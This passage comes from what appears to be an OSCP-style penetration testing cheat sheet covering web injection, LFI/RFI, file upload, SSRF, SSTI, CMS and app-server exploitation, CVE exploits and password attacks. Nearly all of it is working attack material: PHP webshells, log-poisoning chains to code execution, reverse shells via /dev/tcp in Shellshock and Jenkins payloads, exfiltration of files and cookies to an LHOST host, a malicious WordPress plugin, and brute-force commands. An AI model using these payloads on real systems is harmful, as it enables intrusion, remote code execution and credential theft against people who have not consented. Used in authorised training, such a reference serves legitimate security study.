# ── NOSQL INJECTION ───────────────────────────────────────────
# MongoDB:
username[$ne]=x&password[$ne]=x          # GET
{"username":{"$ne":""},"password":{"$ne":""}}   # JSON
username=admin&password[$regex]=.*
username[$gt]=&password[$gt]=
# Bypass login entirely with always-true conditions
```


</details>


<details>


<summary>📂 6.3 LFI / RFI --- Full Exploitation Chain</summary>






``` bash
# ── BASIC LFI DETECTION ───────────────────────────────────────
?page=../../../../etc/passwd
?file=../../../etc/shadow
?lang=....//....//etc/passwd     # Filter bypass
?page=..%252f..%252f..%252fetc%252fpasswd   # Double URL encode
?page=....\/....\/....\/etc/passwd
?page=/etc/passwd%00             # Null byte (PHP < 5.5)
?page=/etc/passwd%00.jpg
?page=....//....//etc/passwd

# ── WINDOWS PATHS ─────────────────────────────────────────────
?file=../../../../windows/system32/drivers/etc/hosts
?file=../../../../windows/win.ini
?file=../../../../windows/system32/config/SAM
?file=C:/xampp/htdocs/index.php

# ── PHP WRAPPERS (CRITICAL!) ──────────────────────────────────
# Read PHP source (b64 encoded):
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=config.php
# Decode: echo "BASE64" | base64 -d

# Read with rot13:
?page=php://filter/read=string.rot13/resource=index.php

# RCE via PHP input:
?page=php://input
# POST body: <?php system($_GET['cmd']); ?>
curl -X POST "http://$IP/page?page=php://input&cmd=id" --data "<?php system(\$_GET['cmd']); ?>"

# RCE via data wrapper:
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# RCE via expect (if enabled):
?page=expect://id

# Zip wrapper:
?page=zip:///path/to/file.zip#shell.php

# Phar wrapper:
?page=phar:///path/to/file.phar

# ── LOG POISONING → RCE ───────────────────────────────────────
# Step 1: Inject PHP into logs via User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://$IP/
# Step 2: Include the log via LFI:
curl "http://$IP/page?file=/var/log/apache2/access.log&cmd=id"
# Works on: access.log, error.log, auth.log, mail.log, vsftpd.log

# Log paths to try:
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log         # If FTP user-agent injection
/var/log/auth.log           # SSH login attempts
/var/log/mail.log
/var/log/syslog
/proc/self/environ          # HTTP_USER_AGENT in environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/var/mail/www-data

# Via SSH (SSH poisoning):
ssh "<?php system(\$_GET['cmd']); ?>"@$IP
curl "http://$IP/page?file=/var/log/auth.log&cmd=id"

# Via SMTP (SMTP poisoning):
telnet $IP 25
MAIL FROM: test@test.com
RCPT TO: www-data
DATA
Subject: <?php system($_GET['cmd']); ?>
.
# Then LFI: ?file=/var/mail/www-data&cmd=id

# ── /PROC FILESYSTEM ──────────────────────────────────────────
/proc/self/cmdline      # Current process command
/proc/self/environ      # Environment variables
/proc/self/fd/         # File descriptors (open files!)
# Read open file descriptors:
?page=/proc/self/fd/0   # stdin
?page=/proc/self/fd/3   # Often the web app config!
# Try 0-20:
for i in $(seq 0 20); do curl -s "http://$IP/page?file=/proc/self/fd/$i"; done

# ── LFI TO FULL RCE PATH ─────────────────────────────────────
# Option 1: Log poisoning (above)
# Option 2: PHP session file
# Session files stored at: /var/lib/php/sessions/sess_SESSIONID
# Inject PHP into session via cookie: PHPSESSID=xxx + vulnerable param
curl "http://$IP/login" -b "PHPSESSID=abc123" --data "user=<?php system(\$_GET['cmd']); ?>"
curl "http://$IP/page?file=/var/lib/php/sessions/sess_abc123&cmd=id"

# Option 3: Upload + LFI
# Upload a PHP file (even as image), include via LFI

# ── RFI ───────────────────────────────────────────────────────
# Test:
?page=http://LHOST/test.txt
?page=\\LHOST\share\test.txt    # Windows SMB RFI
# Requires: allow_url_include = On (php.ini)
# Host payload:
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
python3 -m http.server 80
# Trigger:
curl "http://$IP/page?page=http://$LHOST/shell.php&cmd=id"
```


</details>


<details>


<summary>📤 6.4 File Upload --- Every Bypass Technique</summary>






``` bash
# ── BASIC BYPASSES ────────────────────────────────────────────
# 1. Change extension:
shell.php → shell.php5, shell.php7, shell.phtml, shell.pHp, shell.PHP, shell.Php
shell.asp → shell.asp;.jpg, shell.asa, shell.aspx, shell.cer
shell.jsp → shell.jspx, shell.jsw, shell.jsv, shell.jspf

# 2. Double extension:
shell.jpg.php
shell.png.php

# 3. Null byte (PHP < 5.3.4):
shell.php%00.jpg
shell.php\x00.jpg

# 4. Change Content-Type in Burp:
Content-Type: image/jpeg    (while uploading shell.php)
Content-Type: image/png
Content-Type: image/gif

# 5. Magic bytes — prepend real image header:
echo -e '\xff\xd8\xff\xe0' > shell.php  # JPEG magic bytes
cat webshell.php >> shell.php
# Or:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg.php

# 6. GIF header:
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php.gif

# 7. .htaccess upload (if Apache + writable .htaccess):
# Upload .htaccess with:
AddType application/x-httpd-php .jpg
# Then upload shell.jpg → executes as PHP

# 8. web.config upload (IIS):
<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
<add name="web_config" path="*.config" verb="*" modules="IsapiModule"
scriptProcessor="C:\windows\system32\inetsrv\asp.dll" resourceType="Unspecified"
requireAccess="Write" preCondition="bitness64" /></handlers>
<security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions>
<hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer></configuration>
<%
Dim oSO : Set oSO = Server.CreateObject("MSXML2.DOMDocument.6.0")
Dim oXML : Set oXML = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")
oXML.Open "POST","http://LHOST",False
oXML.setRequestHeader "Content-Type","text/xml; charset=utf-8"
oXML.Send("<command>" & Request.Form("cmd") & "</command>")
%>

# 9. SVG XSS + SSRF:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('http://LHOST/?c='+document.cookie)</script>
</svg>

# ── CHECK WHERE FILE IS STORED ────────────────────────────────
# After upload, the path is often:
# /uploads/shell.php
# /files/shell.php
# /media/shell.php
# /images/shell.php
# Check response for path, or fuzz:
gobuster dir -u http://$IP -w common.txt -x php,jpg,png

# ── EXIFTOOL INJECTION ────────────────────────────────────────
exiftool -DocumentName="<?php system(\$_GET['cmd']); ?>" image.jpg
# Then if PHP is processing EXIF data via getimagesize or exif_read_data → RCE

# ── IMAGEMAGICK CVE-2016-3714 (ImageTragick) ─────────────────
# Upload .mvg or .svg file:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.png";|id; ")'
pop graphic-context
```


</details>


<details>


<summary>💻 6.5 Command Injection --- Full Bypass Arsenal</summary>






``` bash
# ── BASIC OPERATORS ───────────────────────────────────────────
; id                    # Semicolon — run after
&& id                   # AND — run if first succeeds
|| id                   # OR — run if first fails
| id                    # Pipe — chain commands
& id                    # Background — run concurrently
`id`                    # Backtick — command substitution
$(id)                   # Dollar paren — substitution
%0a id                  # Newline (URL encoded)
%0d%0a id               # CRLF

# ── SPACE BYPASS ──────────────────────────────────────────────
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat%09/etc/passwd          # Tab

# ── BLACKLIST BYPASS ──────────────────────────────────────────
# If "cat" is blacklisted:
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
/bin/c?t /etc/passwd       # Wildcard
/bin/ca* /etc/passwd       # Wildcard
echo 'cat' | bash          # Via echo

# If "/" is blacklisted:
${HOME:0:1}etc${HOME:0:1}passwd
# ${HOME} = /home/user → ${HOME:0:1} = '/'

# ── BLIND COMMAND INJECTION ───────────────────────────────────
# Time-based detection:
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5

# Out-of-band (DNS exfil):
127.0.0.1; nslookup $(whoami).LHOST
127.0.0.1; curl http://LHOST/$(whoami)
127.0.0.1; wget http://LHOST/?data=$(cat /etc/passwd | base64)

# File-based:
127.0.0.1; id > /var/www/html/out.txt
# Then: curl http://$IP/out.txt

# ── FILTER BYPASS TRICKS ──────────────────────────────────────
# Encode payload:
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64
# Execute:
echo BASE64 | base64 -d | bash
# Or URL encode the whole thing
```


</details>


<details>


<summary>🔁 6.6 SSRF --- Server-Side Request Forgery</summary>






``` bash
# ── BASIC DETECTION ───────────────────────────────────────────
# Start listener: nc -nvlp 80
url=http://LHOST/test
url=http://LHOST:80/test
# If you get connection → SSRF confirmed

# ── INTERNAL PORT SCAN VIA SSRF ───────────────────────────────
ffuf -u "http://$IP/api?url=http://127.0.0.1:FUZZ" \
  -w /usr/share/seclists/Fuzzing/Ports/Common-Ports-TCP.txt \
  -fs 0    # Filter empty responses

# ── LOCALHOST BYPASS ──────────────────────────────────────────
http://127.0.0.1/
http://0.0.0.0/
http://localhost/
http://[::1]/               # IPv6
http://[::]:/               # IPv6
http://0/
http://0.0.0.0:80/
http://127.1/
http://127.0.1/
http://0177.0.0.1/          # Octal
http://2130706433/          # Decimal
http://0x7f000001/          # Hex
http://127.0.0.1.nip.io/    # DNS rebinding

# ── CLOUD METADATA ────────────────────────────────────────────
# AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
# GCP:
http://metadata.google.internal/computeMetadata/v1/
# Azure:
http://169.254.169.254/metadata/instance?api-version=2021-01-01

# ── PROTOCOL SMUGGLING ────────────────────────────────────────
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall
ftp://127.0.0.1:21/
ldap://127.0.0.1:389/
```


</details>


<details>


<summary>🖋️ 6.7 SSTI --- Server-Side Template Injection</summary>






``` bash
# ── DETECTION ─────────────────────────────────────────────────
{{7*7}}        # → 49 (Jinja2/Twig)
${7*7}         # → 49 (Freemarker/Velocity)
<%= 7*7 %>     # → 49 (ERB/Ruby)
#{7*7}         # → 49 (Ruby Slim)
*{7*7}         # → 49 (Thymeleaf)
{{7*'7'}}      # → 49 or 7777777 (helps distinguish Jinja2 vs Twig)

# ── JINJA2 (Python/Flask) ─────────────────────────────────────
{{config}}                              # Dump config (may have SECRET_KEY)
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}   # Class enumeration
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
# Better RCE (find subprocess index):
{{''.__class__.__mro__[1].__subclasses__()}}
# Then find subprocess.Popen index (usually 258-280):
{{ ''.__class__.__mro__[1].__subclasses__()[POPEN_INDEX]('id',shell=True,stdout=-1).communicate()[0].strip() }}
# Or use cyclic approach:
{% for x in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in x.__name__ %}
    {{x('id',shell=True,stdout=-1).communicate()[0]}}
  {% endif %}
{% endfor %}

# ── TWIG (PHP) ────────────────────────────────────────────────
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

# ── FREEMARKER (Java) ─────────────────────────────────────────
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# ── VELOCITY (Java) ───────────────────────────────────────────
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())

# ── ERB (Ruby) ────────────────────────────────────────────────
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>
```


</details>


<details>


<summary>🔐 6.8 Authentication Bypasses</summary>






``` bash
# ── JWT ATTACKS ───────────────────────────────────────────────
# Decode JWT:
echo "PAYLOAD" | base64 -d    # Middle part (base64url)
# Online: jwt.io

# Alg:none attack:
# Change header: {"alg":"none","typ":"JWT"}
# Remove signature (keep trailing dot)
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).rstrip(b'=')
print(header.decode() + '.' + payload.decode() + '.')
"

# HS256 → RS256 confusion (if you have public key)
# Brute force weak secret:
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
john --format=HMAC-SHA256 jwt.txt

# ── OAUTH BYPASS ──────────────────────────────────────────────
# Open redirect in redirect_uri
# State parameter not validated

# ── COMMON BYPASS TRICKS ──────────────────────────────────────
# Case manipulation:
/Admin → /admin bypass → /ADMIN
# Add extra slashes:
//admin
/./admin
# Null byte:
/admin%00
# Unicode:
/adm%C0%AFin
# HTTP method:
GET /admin → OPTIONS /admin → POST /admin

# ── IDOR (Insecure Direct Object Reference) ───────────────────
# Change user ID in request:
GET /api/user/1 → /api/user/2
GET /download?file=1 → ?file=2
GET /profile?id=100 → ?id=101
# Horizontal: access other users' same-level data
# Vertical: access higher-privilege data

# ── MASS ASSIGNMENT ───────────────────────────────────────────
# Register: {"username":"user","password":"pass"}
# Try:      {"username":"user","password":"pass","role":"admin","isAdmin":true}
```


</details>


<details>


<summary>🌐 6.9 CMS-Specific Attacks</summary>






``` bash
# ── WORDPRESS ─────────────────────────────────────────────────
# Scan:
#wpscan --url http://$IP -e u,p,t,vp,vt --api-token TOKEN
wpscan --url http://$IP -e u,vp,vt --api-token TOKEN
wp2shell -> https://flawfence.com/blog/en/wp2shell-wordpress-rce-vulnerability-cve-2026-63030/


# Proper wordpress vulnerable plugin scan will take time : 
wpscan --url $DOMAIN -e ap --detection-mode aggressive --api-token TOKEN --plugins-detection aggressive
# User enum only:
wpscan --url http://$IP -e u
# Brute force:
wpscan --url http://$IP -U users.txt -P rockyou.txt --password-attack wp-login
# Enumerate plugins (aggressive):
wpscan --url http://$IP -e ap --plugins-detection aggressive

# Key paths:
/wp-login.php          # Login
/wp-admin/             # Admin panel
/wp-config.php         # DB credentials (try LFI!)
/xmlrpc.php            # RPC interface (brute force vector)
/wp-json/wp/v2/users   # User enum (unauthenticated)
/wp-content/uploads/   # Uploaded files
/.git/                 # Git repo

# Authenticated RCE (admin access):
# Method 1: Theme editor
# Dashboard → Appearance → Theme Editor → 404.php → Add PHP shell → save
curl "http://$IP/wp-content/themes/THEME/404.php?cmd=id"

# Method 2: Plugin upload // https://github.com/xanhacks/wordpress-rce-plugin/
# Dashboard → Plugins → Add New → Upload Plugin
# Create malicious plugin zip:
mkdir mal_plugin
cat > mal_plugin/mal.php << 'EOF'
<?php
/*
Plugin Name: Mal
*/
system($_GET['cmd']);
EOF
zip -r mal_plugin.zip mal_plugin/
# Upload zip → activate → curl http://$IP/wp-content/plugins/mal_plugin/mal.php?cmd=id

# Method 3: xmlrpc.php brute force + RCE
curl -X POST http://$IP/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
# If listMethods works → use wp.getUsersBlogs for brute force

# ── DRUPAL ────────────────────────────────────────────────────
droopescan scan drupal -u http://$IP
# Drupalgeddon2 (CVE-2018-7600):
python3 drupalgeddon2.py http://$IP
# Drupalgeddon3 (CVE-2018-7602):
# Requires authentication
# Shell via PHP filter module:
# Admin → Modules → Enable PHP filter
# Create Basic Page: Body: <?php system($_GET['cmd']); ?> → Text format: PHP code

# ── JOOMLA ────────────────────────────────────────────────────
joomscan --url http://$IP
# Admin path: /administrator
# RCE (admin access):
# Extensions → Templates → Template → index.php → add shell
# Configuration.php via LFI → contains DB password

# ── CONCRETE5 ─────────────────────────────────────────────────
# Admin: /index.php/login
# RCE: System > Permissions > File Manager → upload PHP

# ── TYPO3 ─────────────────────────────────────────────────────
# Admin: /typo3/
# Default: admin:password | admin:admin

# ── STRAPI ────────────────────────────────────────────────────
# Admin: /admin
# CVE-2019-18818: Password reset bypass
# CVE-2019-19609: Authenticated RCE via plugin install
```


</details>


<details>


<summary>☕ 6.10 Application Server Attacks</summary>






``` bash
# ── TOMCAT ────────────────────────────────────────────────────
# Default creds to try:
# admin:admin | tomcat:tomcat | admin:tomcat | tomcat:s3cr3t | admin:s3cr3t
# admin:password | tomcat:password | admin:manager

# Find manager path:
gobuster dir -u http://$IP:8080 -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt
# Common: /manager/html | /host-manager/html | /manager/status

# Deploy WAR shell (authenticated):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
# Via curl:
curl -v -u admin:admin -T shell.war "http://$IP:8080/manager/text/deploy?path=/shell"
curl "http://$IP:8080/shell/"
# Via browser: Manager App → Deploy → WAR file to deploy

# CVE-2020-1938 (Ghostcat) — AJP file read/inclusion:
# Port 8009 must be open
python3 Ghostcat-CNVD-2020-10487.py -p 8009 -a $IP
# Default: read /WEB-INF/web.xml

# Tomcat PUT CVE-2017-12617:
curl -X PUT "http://$IP:8080/shell.jsp/" -d "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>"

# ── JENKINS ───────────────────────────────────────────────────
# Default creds: admin:admin | admin:(blank) | jenkins:jenkins
# Script console: /script (requires admin)
# Groovy RCE:
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"].execute()
println cmd.text
# Or safer:
def cmd = "id"; println cmd.execute().text
# Reverse shell via Groovy:
String host="$LHOST"; int port=$LPORT
String cmd2="bash -c {echo,BASE64}|{base64,-d}|bash"
["bash","-c",cmd2].execute()

# Jenkins CVE-2018-1000861, CVE-2019-10320 etc.
# Check: /jenkins/scriptText?script=...
# Unauthenticated RCE if old version + agent enabled

# ── JBOSS / WILDFLY ───────────────────────────────────────────
# Default: admin:admin | admin:(blank)
# Deploy WAR via /jmx-console or /web-console
# CVE-2015-7501: Java deserialization via JMXInvokerServlet

# ── WEBSPHERE ─────────────────────────────────────────────────
# Admin: /ibm/console
# Default: wsadmin:(blank) | admin:admin
# CVE-2020-4450: Deserialization

# ── GLASSFISH ─────────────────────────────────────────────────
# Admin: https://$IP:4848/
# Default: admin:adminadmin
# Directory traversal: /%c0%ae%c0%ae/..

# ── WEBLOGIC ──────────────────────────────────────────────────
# Admin: http://$IP:7001/console
# Default: weblogic:weblogic | weblogic:welcome1
# CVE-2017-10271, CVE-2019-2725: Deserialization RCE
```


</details>


<details>


<summary>🔓 6.11 XXE, IDOR, XSS, Deserialization</summary>






``` bash
# ── XXE ───────────────────────────────────────────────────────
# Basic file read:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# OOB XXE (blind):
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://LHOST/xxe.dtd"> %xxe;]>
# xxe.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?data=%file;'>">
%eval; %exfil;

# Windows path:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>

# SSRF via XXE:
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

# ── JAVA DESERIALIZATION ──────────────────────────────────────
# Tools: ysoserial, URLDNS chain for detection
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64}|{base64,-d}|bash' > payload.ser
# Check: SerialKiller bypass, URLDNS for blind detection

# ── PHP DESERIALIZATION ───────────────────────────────────────
# Magic methods exploited: __wakeup, __destruct, __toString
# PHPggc tool:
phpggc -l                          # List gadget chains
phpggc Monolog/RCE1 system id
phpggc Laravel/RCE1 system 'id'

# ── XSS → COOKIE THEFT ────────────────────────────────────────
# If XSS → admin panel → can achieve SSRF, file upload, etc.
<script>new Image().src='http://LHOST/?c='+document.cookie</script>
<script>fetch('http://LHOST/?c='+btoa(document.cookie))</script>
# Beef-XSS framework for more advanced attacks
```


</details>


------------------------------------------------------------------------

## 7. EXPLOITATION --- INITIAL ACCESS


<details>


<summary>⚡ 7.1 Quick Win Priority Checklist</summary>






    TIER 1 — Try in first 10 minutes:
    [ ] Anonymous FTP/SMB → read files → find creds/keys
    [ ] Default creds on every web app
    [ ] Searchsploit exact version match with public exploit
    [ ] CVE for exact service version (vsftpd 2.3.4, Apache 2.4.49 etc.)
    [ ] robots.txt/sitemap → find /admin /backup
    [ ] WordPress → wpscan → brute admin
    [ ] EternalBlue if SMB + Windows 7/2008
    [ ] Drupalgeddon if Drupal detected

    TIER 2 — Common paths:
    [ ] SQLi on login forms → admin bypass → file write → shell
    [ ] LFI → log poison → RCE
    [ ] File upload → webshell
    [ ] Exposed .git repo → source code → hardcoded creds
    [ ] Sensitive files in SMB shares → creds
    [ ] SNMP → process args → passwords
    [ ] Config files accessible → DB creds → more access
    [ ] xmlrpc.php brute force (WordPress)

    TIER 3 — Dig deeper:
    [ ] Source code review (extracted from .git or download)
    [ ] API enumeration → undocumented endpoints
    [ ] IDOR/auth bypass in web app
    [ ] XXE in XML input
    [ ] SSRF to internal services
    [ ] Deserialization in Java/.NET apps

    NEVER FORGET:
    [ ] Always try creds found on one service against ALL others
    [ ] Always enumerate new ports/services discovered after initial access
    [ ] Always read every file found — passwords hide everywhere


</details>


<details>


<summary>🔑 7.2 CVE Quick Reference --- OSCP Most Common</summary>






``` bash
# MS17-010 — EternalBlue (SMB, Windows 7 / 2008R2)
nmap --script smb-vuln-ms17-010 $IP
msf: exploit/windows/smb/ms17_010_eternalblue
# Manual: https://github.com/worawit/MS17-010
python3 checker.py $IP
python3 zzz_exploit.py $IP

# MS08-067 — Windows XP / 2003
msf: exploit/windows/smb/ms08_067_netapi
# Manual:
searchsploit ms08-067
# Requires: matching OS version selection

# CVE-2021-41773 + 42013 — Apache 2.4.49/2.4.50 (Path Traversal + RCE)
# Check:
curl http://$IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
curl http://$IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# RCE (if mod_cgi enabled):
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' "http://$IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

# CVE-2014-6271 — Shellshock (bash, CGI scripts)
# Detection:
curl -H "User-Agent: () { :; }; echo; /bin/id" http://$IP/cgi-bin/test.cgi
# Test all CGI scripts:
for cgi in test.cgi status.cgi index.cgi admin.cgi; do
  curl -H "User-Agent: () { :; }; echo; /bin/id" http://$IP/cgi-bin/$cgi 2>/dev/null
done
# Reverse shell:
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" http://$IP/cgi-bin/test.cgi

# vsftpd 2.3.4 — Backdoor
nmap --script ftp-vsftpd-backdoor -p21 $IP
# Trigger:
echo -e "USER user:)\nPASS pass" | nc $IP 21; sleep 2; nc $IP 6200

# CVE-2019-0708 — BlueKeep (RDP, Windows 7/2008)
msf: exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# CVE-2021-4034 — PwnKit (pkexec, most Linux distros)
# Compile and run:
searchsploit CVE-2021-4034
make && ./cve-2021-4034

# CVE-2021-3156 — Baron Samedit (sudo < 1.9.5p2)
sudo --version
# Download and compile exploit from github.com/blasty/CVE-2021-3156

# CVE-2021-1675 / CVE-2021-34527 — PrintNightmare
# Requires: Print Spooler running + writable share or SMB
python3 CVE-2021-1675.py domain/user:pass@$IP '\\LHOST\share\evil.dll'

# CVE-2019-14287 — sudo -u#-1 bypass (sudo < 1.8.28)
# If sudoers: user ALL=(ALL,!root) /bin/bash
sudo -u#-1 /bin/bash     # Becomes root!
sudo -u#4294967295 /bin/bash

# CVE-2019-18634 — sudo pwfeedback buffer overflow (sudo < 1.8.31)

# Dirty COW — CVE-2016-5195 (Linux kernel < 4.8.3)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password    # Adds user firefart with pw

# DirtyPipe — CVE-2022-0847 (Linux kernel 5.8-5.16)
# Overwrite SUID binary or /etc/passwd
```


</details>


------------------------------------------------------------------------

## 8. PASSWORD ATTACKS & CREDENTIAL ABUSE


<details>


<summary>🌐 8.1 Online Guessing --- Guarded Last-Resort Templates</summary>

> **RULE-SENSITIVE / LAST RESORT:** Do not launch these long-list examples by default. First confirm the exact login, valid usernames, scope, lockout/rate-limit behavior and a reason the password is likely in the chosen list. Start with a tiny evidence-based shortlist, low concurrency and `-f`; stop when the signal does not improve.






``` bash
# Replace these with small, evidence-derived files; do not point online tools at rockyou.
SHORTLIST=notes/password-shortlist.txt
USERS=notes/users.txt

# ── HYDRA ─────────────────────────────────────────────────────
# SSH:
test -s "$SHORTLIST" && hydra -l root -P "$SHORTLIST" $IP ssh -t 2 -f
[ -s "$SHORTLIST" ] && [ -s "$USERS" ] && hydra -L "$USERS" -P "$SHORTLIST" $IP ssh -t 2 -f

# FTP:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP ftp -t 2 -f

# HTTP POST form:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" -V
# Multiple failure strings:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Wrong:F=Error:F=failed" -V

# HTTP GET basic auth:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP http-get /admin/ -f
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP http-get-form "/admin/:F=401" -f

# HTTPS:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP https-post-form "/login:user=^USER^&pass=^PASS^:F=error" -f

# RDP:
test -s "$SHORTLIST" && hydra -l administrator -P "$SHORTLIST" rdp://$IP -t 1 -f
[ -s "$SHORTLIST" ] && [ -s "$USERS" ] && hydra -L "$USERS" -P "$SHORTLIST" rdp://$IP -t 1 -f

# SMB:
test -s "$SHORTLIST" && hydra -l administrator -P "$SHORTLIST" $IP smb -t 1 -f

# SMTP:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP smtp -t 1 -f
test -s "$SHORTLIST" && hydra -l admin@domain.com -P "$SHORTLIST" $IP smtp -t 1 -f

# POP3:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP pop3 -t 1 -f

# MySQL:
test -s "$SHORTLIST" && hydra -l root -P "$SHORTLIST" $IP mysql -t 1 -f

# VNC:
test -s "$SHORTLIST" && hydra -P "$SHORTLIST" $IP vnc -t 1 -f

# WordPress:
test -s "$SHORTLIST" && hydra -l admin -P "$SHORTLIST" $IP http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"

# Proxy through Burp (debug):
hydra ... -o /tmp/hydra.txt

# ── MEDUSA ────────────────────────────────────────────────────
test -s "$SHORTLIST" && medusa -h $IP -u admin -P "$SHORTLIST" -M http -m DIR:/admin -T 2
test -s "$SHORTLIST" && medusa -h $IP -u admin -P "$SHORTLIST" -M ssh -T 2
test -s "$SHORTLIST" && medusa -h $IP -u admin -P "$SHORTLIST" -M ftp -T 2

# ── nxc (Windows) ────────────────────────────────────
test -s "$SHORTLIST" && nxc smb $IP -u admin -p "$SHORTLIST"
test -s "$SHORTLIST" && nxc ssh $IP -u admin -p "$SHORTLIST"
[ -s "$SHORTLIST" ] && [ -s "$USERS" ] && nxc winrm $IP -u "$USERS" -p "$SHORTLIST"
# Single password spray:
nxc smb $IP -u users.txt -p 'Password123' --continue-on-success
# Output: green [+] = valid, red [-] = invalid
```


</details>


<details>


<summary>🔓 8.2 Offline Hash Cracking --- Complete Reference</summary>






``` bash
# ── IDENTIFY HASH ─────────────────────────────────────────────
hash-identifier "HASH"
hashid "HASH"
# Or: https://hashes.com/en/tools/hash_identifier

# ── HASHCAT MODE TABLE ────────────────────────────────────────
# 0    = MD5
# 100  = SHA1
# 1400 = SHA256
# 1000 = NTLM (Windows)
# 3000 = LM (old Windows)
# 500  = MD5crypt ($1$)
# 1800 = SHA512crypt ($6$) — Linux /etc/shadow
# 7400 = sha256crypt ($5$)
# 5800 = Android PIN/Password
# 3200 = bcrypt ($2*$)
# 400  = phpass (WordPress, phpBB)
# 2811 = MyBB, IPB
# 13100 = Kerberos 5 TGS-REP (Kerberoast)
# 18200 = Kerberos 5 AS-REP (ASREPRoast)
# 5600 = NetNTLMv2
# 5500 = NetNTLMv1
# 13000 = RAR5
# 22000 = WPA2 PMK
# 22921 = RSA/DSA/EC/OpenSSH Private Keys
# 9600 = MS Office 2013
# 13400 = KeePass
# 16800 = WPA PMKID

# ── HASHCAT COMMANDS ──────────────────────────────────────────
# Basic:
hashcat -m 1000 hashes.txt rockyou.txt

# With rules (multiply cracking power 10x):
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# tell hashcat that there is username as well inside hash
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt --username

# Attack modes:
hashcat -m 1000 -a 0 hash.txt rockyou.txt           # Wordlist
